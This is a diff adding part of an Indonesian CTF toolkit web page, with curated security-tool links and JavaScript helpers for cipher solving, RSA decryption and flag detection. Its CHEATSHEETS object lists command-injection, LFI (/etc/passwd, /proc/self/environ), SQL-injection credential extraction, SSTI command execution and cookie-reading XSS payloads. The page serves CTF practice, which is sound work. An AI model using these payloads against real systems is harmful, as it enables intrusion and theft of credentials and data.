+      <li><a class="refrow" href="https://remix.ethereum.org/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Remix IDE</span><span class="star">★</span><span class="host">remix.ethereum.org ↗</span></div><div class="ds">Tulis, compile, deploy &amp; interaksi kontrak Solidity langsung di browser.</div></a></li>
+      <li><a class="refrow" href="https://etherscan.io/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Etherscan</span><span class="star">★</span><span class="host">etherscan.io ↗</span></div><div class="ds">Jelajah transaksi, kontrak terverifikasi &amp; storage on-chain (ada Sepolia testnet).</div></a></li>
+      <li><a class="refrow" href="https://app.dedaub.com/decompile" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Dedaub Decompiler</span><span class="star">★</span><span class="host">app.dedaub.com ↗</span></div><div class="ds">Decompile bytecode EVM jadi Solidity-semu yang mudah dibaca.</div></a></li>
+      <li><a class="refrow" href="https://www.evm.codes/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">evm.codes</span><span class="host">evm.codes ↗</span></div><div class="ds">Referensi opcode EVM + playground eksekusi langkah-demi-langkah.</div></a></li>
+      <li><a class="refrow" href="https://www.4byte.directory/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">4byte Directory</span><span class="host">4byte.directory ↗</span></div><div class="ds">Cari nama fungsi/event dari selector 0x… yang tak dikenal.</div></a></li>
+      <li><a class="refrow" href="https://ethervm.io/decompile" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">EtherVM</span><span class="host">ethervm.io ↗</span></div><div class="ds">Decompiler + referensi opcode alternatif (Dedaub cadangan).</div></a></li>
+    </ul>
+  </details>
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg></span><span class="gt">Forensik Digital</span><span class="cnt">7 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
+      <li><a class="refrow" href="https://aperisolve.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Aperi’Solve</span><span class="star">★</span><span class="host">aperisolve.com ↗</span></div><div class="ds">All-in-one stego: zsteg+steghide+binwalk+exiftool+foremost.</div></a></li>
+      <li><a class="refrow" href="https://georgeom.net/StegOnline/upload" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">StegOnline</span><span class="star">★</span><span class="host">georgeom.net ↗</span></div><div class="ds">Analisa LSB / bit-plane gambar secara interaktif.</div></a></li>
+      <li><a class="refrow" href="https://fotoforensics.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">FotoForensics</span><span class="host">fotoforensics.com ↗</span></div><div class="ds">Error Level Analysis (ELA) untuk deteksi editan gambar.</div></a></li>
+      <li><a class="refrow" href="https://hexed.it/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">hexed.it</span><span class="host">hexed.it ↗</span></div><div class="ds">Hex editor penuh di browser.</div></a></li>
+      <li><a class="refrow" href="https://www.metadata2go.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">metadata2go</span><span class="host">metadata2go.com ↗</span></div><div class="ds">Baca metadata/EXIF berkas dengan cepat.</div></a></li>
+      <li><a class="refrow" href="https://zxing.org/w/decode.jspx" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">ZXing Decoder</span><span class="host">zxing.org ↗</span></div><div class="ds">Decode QR / barcode dari gambar.</div></a></li>
+      <li><a class="refrow" href="https://apackets.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">A-Packets</span><span class="host">apackets.com ↗</span></div><div class="ds">Analisa file PCAP online (alternatif Wireshark).</div></a></li>
+    </ul>
+  </details>
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><path d="M9 2v2M15 2v2M9 20v2M15 20v2M20 9h2M20 14h2M2 9h2M2 14h2"/></svg></span><span class="gt">Reverse Engineering</span><span class="cnt">6 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
+      <li><a class="refrow" href="https://dogbolt.org/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Decompiler Explorer</span><span class="star">★</span><span class="host">dogbolt.org ↗</span></div><div class="ds">Ghidra/angr/BinaryNinja/Hex-Rays sekaligus - upload biner.</div></a></li>
+      <li><a class="refrow" href="https://godbolt.org/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Compiler Explorer</span><span class="star">★</span><span class="host">godbolt.org ↗</span></div><div class="ds">Compile C/C++/Rust → assembly (beda dari dogbolt).</div></a></li>
+      <li><a class="refrow" href="https://onlinedisassembler.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">ODA</span><span class="host">onlinedisassembler.com ↗</span></div><div class="ds">Disassembler daring, banyak arsitektur.</div></a></li>
+      <li><a class="refrow" href="https://sharplab.io/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">SharpLab</span><span class="host">.NET / C# ↗</span></div><div class="ds">Inspeksi &amp; decompile C#/.NET (IL, JIT asm).</div></a></li>
+      <li><a class="refrow" href="http://www.javadecompilers.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Java Decompilers</span><span class="host">javadecompilers.com ↗</span></div><div class="ds">Decompile .class/.jar/APK (JADX, CFR, Procyon).</div></a></li>
+      <li><a class="refrow" href="https://www.onlinegdb.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">OnlineGDB</span><span class="host">onlinegdb.com ↗</span></div><div class="ds">Compile &amp; debug C/C++/Python online.</div></a></li>
+    </ul>
+  </details>
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></span><span class="gt">Binary Exploitation (Pwn)</span><span class="cnt">6 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
+      <li><a class="refrow" href="https://libc.rip/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">libc.rip</span><span class="star">★</span><span class="host">libc.rip ↗</span></div><div class="ds">Cari versi libc dari alamat fungsi yang bocor. Wajib ret2libc.</div></a></li>
+      <li><a class="refrow" href="https://libc.blukat.me/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">libc-database (blukat)</span><span class="star">★</span><span class="host">libc.blukat.me ↗</span></div><div class="ds">Pencari libc + offset simbol, antarmuka cepat.</div></a></li>
+      <li><a class="refrow" href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">defuse x86 asm</span><span class="star">★</span><span class="host">defuse.ca ↗</span></div><div class="ds">Assemble/disassemble x86/x64 di browser.</div></a></li>
+      <li><a class="refrow" href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">shell-storm shellcode</span><span class="host">shell-storm.org ↗</span></div><div class="ds">Database shellcode berbagai arsitektur.</div></a></li>
+      <li><a class="refrow" href="https://syscall.sh/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">syscall table</span><span class="host">syscall.sh ↗</span></div><div class="ds">Tabel nomor syscall Linux x86/x64/arm.</div></a></li>
+      <li><a class="refrow" href="https://www.onlinegdb.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">OnlineGDB</span><span class="host">onlinegdb.com ↗</span></div><div class="ds">Debug C online - memahami stack/register.</div></a></li>
+    </ul>
+  </details>
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span><span class="gt">Web Exploitation</span><span class="cnt">9 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
+      <li><a class="refrow" href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">revshells</span><span class="star">★</span><span class="host">revshells.com ↗</span></div><div class="ds">Generator reverse shell semua bahasa + listener.</div></a></li>
+      <li><a class="refrow" href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">GTFOBins</span><span class="star">★</span><span class="host">gtfobins.github.io ↗</span></div><div class="ds">Teknik bypass/privesc lewat binary Unix. Wajib.</div></a></li>
+      <li><a class="refrow" href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Lolbas</span><span class="host">lolbas-project.github.io ↗</span></div><div class="ds">Padanan GTFOBins untuk Windows.</div></a></li>
+      <li><a class="refrow" href="https://jwt.io/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">jwt.io</span><span class="star">★</span><span class="host">jwt.io ↗</span></div><div class="ds">Decode, verifikasi &amp; utak-atik JWT.</div></a></li>
+      <li><a class="refrow" href="https://crackstation.net/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">CrackStation</span><span class="star">★</span><span class="host">crackstation.net ↗</span></div><div class="ds">Crack hash (MD5/SHA/NTLM) via rainbow table. Juga kripto.</div></a></li>
+      <li><a class="refrow" href="https://hashes.com/en/decrypt/hash" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">hashes.com</span><span class="host">hashes.com ↗</span></div><div class="ds">Identifikasi + crack hash komunitas.</div></a></li>
+      <li><a class="refrow" href="https://regex101.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">regex101</span><span class="host">regex101.com ↗</span></div><div class="ds">Uji &amp; jelaskan regex (payload/parsing).</div></a></li>
+      <li><a class="refrow" href="https://webhook.site/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">webhook.site</span><span class="host">webhook.site ↗</span></div><div class="ds">Tangkap callback OOB untuk uji SSRF/blind (eksternal).</div></a></li>
+      <li><a class="refrow" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">PayloadsAllTheThings</span><span class="star">★</span><span class="host">github.com ↗</span></div><div class="ds">Kumpulan payload &amp; teknik tiap kategori.</div></a></li>
+    </ul>
+  </details>
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="12 2 15.1 8.6 22 9.3 17 14 18.2 21 12 17.6 5.8 21 7 14 2 9.3 8.9 8.6 12 2"/></svg></span><span class="gt">Umum / Lintas-kategori</span><span class="cnt">4 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
+      <li><a class="refrow" href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">CyberChef</span><span class="star">★</span><span class="host">gchq.github.io ↗</span></div><div class="ds">Swiss-army encode/decode/kripto/forensik ringan.</div></a></li>
+      <li><a class="refrow" href="https://github.com/HashPals/Name-That-Hash" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Name-That-Hash</span><span class="host">github.com ↗</span></div><div class="ds">Tebak jenis hash dari bentuknya.</div></a></li>
+      <li><a class="refrow" href="https://www.wolframalpha.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">WolframAlpha</span><span class="host">wolframalpha.com ↗</span></div><div class="ds">Mesin hitung matematika serba-bisa.</div></a></li>
+      <li><a class="refrow" href="https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">CyberChef Magic</span><span class="host">gchq.github.io ↗</span></div><div class="ds">Resep “Magic”: auto-detect lapisan encoding.</div></a></li>
+    </ul>
+  </details>
+
+</div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <script>
+  // Global Data & Utilities
+  const CHEATSHEETS = {"Command Injection": ["; id", "| id", "$(id)", "`id`", "%0aid", "|| id", "& whoami", "| cat flag*", "; cat /flag.txt", "&& cat /flag", "`cat flag`"], "LFI": ["../../../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....\\\\....\\\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ"], "SQLi": ["' OR '1'='1", "' OR 1=1-- -", "' UNION SELECT NULL,version()-- -", "admin'-- -", "') OR ('1'='1", "1' AND SLEEP(5)-- -", "' UNION SELECT null,username,password FROM users-- -", "' AND 1=0 UNION ALL SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"], "SSTI": ["{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "*{7*7}", "#{7*7}"], "XSS": ["<script>alert(1)<\/script>", "\"><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)", "'><script>fetch('/'+document.cookie)<\/script>"]};
+  const FLAG_RX = /(?:GETSFLAG|picoCTF|pico|FLAG|flag|CTF|HTB|THM)\{[^\{}\n]{1,80}\}/g;
+  const _seenFlags = new Set();
+
+  function esc(s) {
+    if (s === null || s === undefined) return '';
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+  }
+
+  function toast(msg, type = 'success') {
+    const el = document.createElement('div');
+    el.className = 'toast-popup' + (type === 'error' ? ' toast-err' : '');
+    el.textContent = msg;
+    document.body.appendChild(el);
+    setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 200); }, 2200);
+  }
+
+  function copyCode(btn) {
+    const card = btn.closest('.card') || btn.closest('.code');
+    const codeEl = card ? card.querySelector('code, pre') : null;
+    if (!codeEl) return;
+    const txt = codeEl.innerText || codeEl.textContent;
+    navigator.clipboard.writeText(txt).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = 'Tersalin!';
+      btn.classList.add('copied');
+      toast('Tersalin ke clipboard');
+      setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 1500);
+    });
+  }
+
+  function copyFlag(flag) {
+    navigator.clipboard.writeText(flag).then(() => {
+      toast('Flag disalin: ' + flag);
+    });
+  }
+
+  function renderCodeBox(lang, content, codeId = '') {
+    scanText(content);
+    return '<div class="code" style="margin-top:12px">'
+      + '<div class="code__bar"><span class="code__lang">' + esc(lang) + '</span><button type="button" class="code__copy" onclick="copyCode(this)">Salin</button></div>'
+      + '<div class="code__scroll"><pre class="code__body"><code' + (codeId ? ' id="' + codeId + '"' : '') + '>' + esc(content) + '</code></pre></div>'
+      + '</div>';
+  }
+
+  // Flag Sniffer
+  function scanText(txt) {
+    if (!txt) return;
+    const matches = String(txt).match(FLAG_RX);
+    if (!matches) return;
+    let fresh = false;
+    matches.forEach(f => {
+      if (!_seenFlags.has(f)) { _seenFlags.add(f); fresh = true; }
+    });
+    if (fresh) updateFlagBanner();
+  }
+
+  function updateFlagBanner() {
+    const banner = document.getElementById('flagsniff');
+    const title = document.getElementById('flagsniff-title');
+    const list = document.getElementById('flagsniff-list');
+    if (!banner || !list) return;
+    const flags = Array.from(_seenFlags);
+    if (flags.length === 0) { banner.style.display = 'none'; return; }
+    banner.style.display = 'flex';
+    title.textContent = 'Flag terdeteksi (' + flags.length + ') - klik untuk salin';
+    list.innerHTML = flags.map(f => '<button type="button" class="fs-flag" onclick="copyFlag(\'' + esc(f) + '\')">' + esc(f) + '</button>').join('');
+  }
+
+  // Navigation & Router
+  function switchView(route) {
+    route = (route || 'dashboard').replace(/^#/, '');
+    const valid = ['dashboard', 'crypto', 'blockchain', 'forensics', 'reverse', 'pwn', 'web', 'referensi'];
+    if (!valid.includes(route)) route = 'dashboard';
+
+    document.querySelectorAll('.view-container').forEach(v => v.classList.remove('is-active'));
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('is-active'));
+
+    const targetView = document.getElementById('view-' + route);
+    if (targetView) targetView.classList.add('is-active');
+
+    const targetNav = document.querySelector('.nav-item[data-nav="' + route + '"]');
+    if (targetNav) targetNav.classList.add('is-active');
+
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    closeMobileDrawer();
+  }
+
+  window.addEventListener('hashchange', () => switchView(location.hash));
+
+  // Subtabs Switcher
+  function initSubtabs() {
+    document.querySelectorAll('.subtabs').forEach(group => {
+      const gName = group.getAttribute('data-group');
+      const tabs = group.querySelectorAll('.subtab');
+      tabs.forEach(t => {
+        t.addEventListener('click', () => {
+          tabs.forEach(x => { x.classList.remove('is-active'); x.setAttribute('aria-selected', 'false'); });
+          t.classList.add('is-active');
+          t.setAttribute('aria-selected', 'true');
+          const tabId = t.getAttribute('data-tab');
+          const parent = group.closest('section') || document;
+          parent.querySelectorAll('.tabpanel[data-group="' + gName + '"]').forEach(p => {
+            if (p.getAttribute('data-tab') === tabId) {
+              p.removeAttribute('hidden');
+            } else {
+              p.setAttribute('hidden', '');
+            }
+          });
+        });
+      });
+    });
+  }
+
+  // Mobile Drawer
+  function initBurger() {
+    const burger = document.getElementById('burger');
+    const side = document.getElementById('sidenav');
+    const scrim = document.getElementById('scrim');
+    if (!burger || !side || !scrim) return;
+
+    burger.addEventListener('click', () => {
+      side.classList.toggle('open');
+      scrim.classList.toggle('open');
+    });
+    scrim.addEventListener('click', closeMobileDrawer);
+  }
+
+  function closeMobileDrawer() {
+    const side = document.getElementById('sidenav');
+    const scrim = document.getElementById('scrim');
+    if (side) side.classList.remove('open');
+    if (scrim) scrim.classList.remove('open');
+  }
+
+  // Global Card Search
+  function filterCards(q) {
+    q = (q || '').toLowerCase().trim();
+    document.querySelectorAll('#dashboard-grid .cat-card').forEach(card => {
+      const kw = (card.getAttribute('data-keywords') || '') + ' ' + card.innerText.toLowerCase();
+      card.style.display = (!q || kw.includes(q)) ? 'block' : 'none';
+    });
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
+      e.preventDefault();
+      const s = document.getElementById('global-search');
+      if (s) { s.focus(); s.select(); }
+    }
+  });
+
+  // ---------------- CRYPTO SOLVERS ----------------
+  function modPow(b, exp, m) {
+    let res = 1n;
+    b = b % m;
+    while (exp > 0n) {
+      if (exp % 2n === 1n) res = (res * b) % m;
+      exp = exp / 2n;
+      b = (b * b) % m;
+    }
+    return res;
+  }
+
+  function egcd(a, b) {
+    if (b === 0n) return [1n, 0n, a];
+    const [x1, y1, d] = egcd(b, a % b);
+    return [y1, x1 - (a / b) * y1, d];
+  }
+
+  function modInverse(e, phi) {
+    const [x, y, g] = egcd(e, phi);
+    if (g !== 1n && g !== -1n) return null;
+    return ((x % phi) + phi) % phi;
+  }
+
+  function bigIntToAscii(bn) {
+    let hex = bn.toString(16);
+    if (hex.length % 2) hex = '0' + hex;
+    let s = '';
+    for (let i = 0; i < hex.length; i += 2) {
+      const code = parseInt(hex.substr(i, 2), 16);
+      s += (code >= 32 && code <= 126) ? String.fromCharCode(code) : '.';
+    }
+    return s;
+  }
+
+  function solveRSAManual() {
+    const nStr = document.getElementById('rsa_n').value.trim();
+    const eStr = document.getElementById('rsa_e').value.trim() || '65537';
+    const cStr = document.getElementById('rsa_c').value.trim();
+    const pStr = document.getElementById('rsa_p').value.trim();
+    const qStr = document.getElementById('rsa_q').value.trim();
+    const dStr = document.getElementById('rsa_d').value.trim();
+    const out = document.getElementById('rsa_out');
+
+    try {
+      const e = BigInt(eStr);
+      let d = null;
+      let n = nStr ? BigInt(nStr) : null;
+
+      if (dStr) {
+        d = BigInt(dStr);
+      } else if (pStr && qStr) {
+        const p = BigInt(pStr);
+        const q = BigInt(qStr);
+        if (!n) n = p * q;
+        const phi = (p - 1n) * (q - 1n);
+        d = modInverse(e, phi);
+      }
+
+      if (!d || !n || !cStr) {
+        out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Memerlukan parameter minimum: (p, q, e, c) ATAU (n, d, c).</span></div>';
+        return;
+      }
+
+      const c = BigInt(cStr);
+      const m = modPow(c, d, n);
+      const ascii = bigIntToAscii(m);
+      const hex = m.toString(16);
+
+      let res = 'Plaintext (Desimal): ' + m.toString() + '\n'
+              + 'Plaintext (Hex): 0x' + hex + '\n'
+              + 'Plaintext (ASCII): ' + ascii;
+      out.innerHTML = renderCodeBox('RSA RECOVERED', res);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Gagal: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function runCryptoAuto() {
+    const txt = document.getElementById('cauto_in').value.trim();
+    const out = document.getElementById('cauto_out');
+    if (!txt) { out.innerHTML = ''; return; }
+
+    const results = [];
+
+    // 1. RSA Auto-detection
+    const nMatch = txt.match(/n\s*[:=]\s*([0-9]+)/i);
+    const eMatch = txt.match(/e\s*[:=]\s*([0-9]+)/i);
+    const cMatch = txt.match(/c\s*[:=]\s*([0-9]+)/i);
+    const pMatch = txt.match(/p\s*[:=]\s*([0-9]+)/i);
+    const qMatch = txt.match(/q\s*[:=]\s*([0-9]+)/i);
+
+    if (pMatch && qMatch && cMatch) {
+      try {
+        const p = BigInt(pMatch[1]), q = BigInt(qMatch[1]), c = BigInt(cMatch[1]);
+        const e = eMatch ? BigInt(eMatch[1]) : 65537n;
+        const n = p * q;
+        const phi = (p - 1n) * (q - 1n);
+        const d = modInverse(e, phi);
+        const m = modPow(c, d, n);
+        results.push('[RSA Auto-Solve]\n' + bigIntToAscii(m) + ' (0x' + m.toString(16) + ')');
+      } catch(e) {}
+    }
+
+    // 2. Base64
+    try {
+      if (/^[A-Za-z0-9+/=]{8,}$/.test(txt.replace(/\s+/g, ''))) {
+        const b64 = atob(txt.replace(/\s+/g, ''));
+        results.push('[Base64 Decode]\n' + b64);
+      }
+    } catch(e) {}
+
+    // 3. Hex
+    const cleanHex = txt.replace(/^0x/i, '').replace(/\s+/g, '');
+    if (/^[0-9a-fA-F]{8,}$/.test(cleanHex) && cleanHex.length % 2 === 0) {
+      let s = '';
+      for (let i = 0; i < cleanHex.length; i += 2) {
+        const c = parseInt(cleanHex.substr(i, 2), 16);
+        s += (c >= 32 && c <= 126) ? String.fromCharCode(c) : '.';
+      }
+      results.push('[Hex Decode]\n' + s);
+    }
+
+    // 4. Caesar shifts (check for flag)
+    for (let shift = 1; shift < 26; shift++) {
+      let decoded = '';
+      for (let i = 0; i < txt.length; i++) {
+        const code = txt.charCodeAt(i);
+        if (code >= 65 && code <= 90) decoded += String.fromCharCode(((code - 65 - shift + 26) % 26) + 65);
+        else if (code >= 97 && code <= 122) decoded += String.fromCharCode(((code - 97 - shift + 26) % 26) + 97);
+        else decoded += txt[i];
+      }
+      if (FLAG_RX.test(decoded) || decoded.toLowerCase().includes('getsflag') || decoded.toLowerCase().includes('ctf')) {
+        results.push('[Caesar Shift ' + shift + ' (Flag Terdeteksi)]\n' + decoded);
+      }
+    }
+
+    // 5. XOR 1-byte brute force (scan for flag)
+    if (cleanHex.length >= 8 && cleanHex.length % 2 === 0) {
+      const bytes = [];
+      for (let i = 0; i < cleanHex.length; i += 2) bytes.push(parseInt(cleanHex.substr(i, 2), 16));
+      for (let k = 1; k < 256; k++) {
+        let dec = '';
+        for (let b of bytes) {
+          const x = b ^ k;
+          dec += (x >= 32 && x <= 126) ? String.fromCharCode(x) : '.';
+        }
+        if (FLAG_RX.test(dec) || dec.includes('GETSFLAG') || dec.includes('pico') || dec.includes('FLAG{')) {
+          results.push('[XOR Key 0x' + k.toString(16).padStart(2, '0') + ']\n' + dec);
+        }
+      }
+    }
+
+    if (results.length === 0) {
+      results.push('Tidak ada format yang langsung cocok. Coba buka subtab RSA atau Cipher klasik untuk dekripsi spesifik.');
+    }
+
+    out.innerHTML = renderCodeBox('AUTO DETECT RESULTS', results.join('\n\n----------------------------------------\n\n'));
+  }
+
+  function solveKlasik() {
+    const txt = document.getElementById('klasik_in').value;
+    const type = document.getElementById('klasik_type').value;
+    const key = document.getElementById('klasik_key').value.trim();
+    const out = document.getElementById('klasik_out');
+
+    if (!txt) { out.innerHTML = ''; return; }
+
+    let res = '';
+    if (type === 'caesar') {
+      const lines = [];
+      for (let s = 1; s <= 25; s++) {
+        let dec = '';
+        for (let i = 0; i < txt.length; i++) {
+          const c = txt.charCodeAt(i);
+          if (c >= 65 && c <= 90) dec += String.fromCharCode(((c - 65 - s + 26) % 26) + 65);
+          else if (c >= 97 && c <= 122) dec += String.fromCharCode(((c - 97 - s + 26) % 26) + 97);
+          else dec += txt[i];
+        }
+        lines.push('Shift ' + String(s).padStart(2, ' ') + ': ' + dec);
+      }
+      res = lines.join('\n');
+    } else if (type === 'xor_brute') {
+      let bytes = [];
+      const clean = txt.replace(/^0x/, '').replace(/\s+/g, '');
+      if (/^[0-9a-fA-F]+$/.test(clean) && clean.length % 2 === 0) {
+        for (let i = 0; i < clean.length; i += 2) bytes.push(parseInt(clean.substr(i, 2), 16));
+      } else {
+        for (let i = 0; i < txt.length; i++) bytes.push(txt.charCodeAt(i));
+      }
+      const lines = [];
+      for (let k = 0; k < 256; k++) {
+        let dec = '';
+        for (let b of bytes) {
+          const x = b ^ k;
+          dec += (x >= 32 && x <= 126) ? String.fromCharCode(x) : '.';
+        }
+        lines.push('Key 0x' + k.toString(16).padStart(2, '0') + ': ' + dec);
+      }
+      res = lines.join('\n');
+    } else if (type === 'xor_key') {
+      const kBytes = [];
+      for (let i = 0; i < key.length; i++) kBytes.push(key.charCodeAt(i));
+      let bytes = [];
+      const clean = txt.replace(/^0x/, '').replace(/\s+/g, '');
+      if (/^[0-9a-fA-F]+$/.test(clean) && clean.length % 2 === 0) {
+        for (let i = 0; i < clean.length; i += 2) bytes.push(parseInt(clean.substr(i, 2), 16));
+      } else {
+        for (let i = 0; i < txt.length; i++) bytes.push(txt.charCodeAt(i));
+      }
+      let dec = '';
+      for (let i = 0; i < bytes.length; i++) {
+        const x = bytes[i] ^ kBytes[i % kBytes.length];
+        dec += (x >= 32 && x <= 126) ? String.fromCharCode(x) : '.';
+      }
+      res = dec;
+    } else if (type === 'vigenere') {
+      const cleanKey = key.toUpperCase().replace(/[^A-Z]/g, '');
+      if (!cleanKey) { out.innerHTML = '<div class="infobox"><span>Memerlukan key huruf (A-Z).</span></div>'; return; }
+      let dec = '';
+      let ki = 0;
+      for (let i = 0; i < txt.length; i++) {
+        const c = txt.charCodeAt(i);
+        const shift = cleanKey.charCodeAt(ki % cleanKey.length) - 65;
+        if (c >= 65 && c <= 90) { dec += String.fromCharCode(((c - 65 - shift + 26) % 26) + 65); ki++; }
+        else if (c >= 97 && c <= 122) { dec += String.fromCharCode(((c - 97 - shift + 26) % 26) + 97); ki++; }
+        else dec += txt[i];
+      }
+      res = dec;
+    }
+
+    out.innerHTML = renderCodeBox('CIPHER OUTPUT', res);
+  }
+
+  function toggleKlasikKeyInput(type) {
+    const wrap = document.getElementById('klasik_key_wrap');
+    if (type === 'xor_key' || type === 'vigenere' || type === 'affine' || type === 'railfence') {
+      wrap.style.display = 'block';
+    } else {
+      wrap.style.display = 'none';
+    }
+  }
+
+  // ---------------- BLOCKCHAIN SOLVERS ----------------
+  function calcKeccak() {
+    const txt = document.getElementById('bc_kin').value;
+    const isHex = document.getElementById('bc_khex').checked;
+    const out = document.getElementById('bc_kout');
+
+    if (!txt) { out.innerHTML = ''; return; }
+    try {
+      let bytes;
+      if (isHex) {
+        let clean = txt.replace(/^0x/, '').replace(/\s+/g, '');
+        if (clean.length % 2) clean = '0' + clean;
+        bytes = NobleCrypto.hexToBytes(clean);
+      } else {
+        bytes = NobleCrypto.utf8ToBytes(txt);
+      }
+      const hash = '0x' + NobleCrypto.bytesToHex(NobleCrypto.keccak_256(bytes));
+      out.innerHTML = renderCodeBox('KECCAK-256', hash);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Error: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function calcSelector() {
